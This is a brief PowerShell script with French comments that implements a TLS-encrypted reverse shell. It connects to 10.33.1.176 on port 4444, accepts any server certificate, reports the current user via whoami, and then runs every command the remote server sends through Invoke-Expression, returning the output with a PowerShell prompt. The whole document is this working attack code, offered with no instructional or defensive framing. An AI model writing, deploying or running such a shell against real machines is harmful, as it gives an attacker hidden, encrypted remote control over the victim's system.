code du script 

#  TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$ip = "10.33.1.176"  # IP du serveur Linux qui écoute
$port = 4444

$client = New-Object System.Net.Sockets.TcpClient
$client.Connect($ip, $port)

# Config SSL
$sslStream = New-Object System.Net.Security.SslStream(
    $client.GetStream(),
    $false,
    { param($sender, $certificate, $chain, $errors) return $true },  # Callback plus détaillé
    $null,
    [System.Net.Security.EncryptionPolicy]::RequireEncryption
)

# Config l'authentification
$sslStream.AuthenticateAsClient(
    "FakeServer",
    $null,
    [System.Security.Authentication.SslProtocols]::Tls12,
    $false
)

$writer = New-Object System.IO.StreamWriter($sslStream)
$buffer = New-Object Byte[] 1024
$encoding = New-Object System.Text.ASCIIEncoding

$whoami = whoami
$writer.WriteLine("Identité : $whoami")
$writer.Flush()

while (($i = $sslStream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = $encoding.GetString($buffer, 0, $i)
    $sendback = (Invoke-Expression $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
    $writer.Write($sendback2)
    $writer.Flush()
}

$sslStream.Close()
$client.Close()
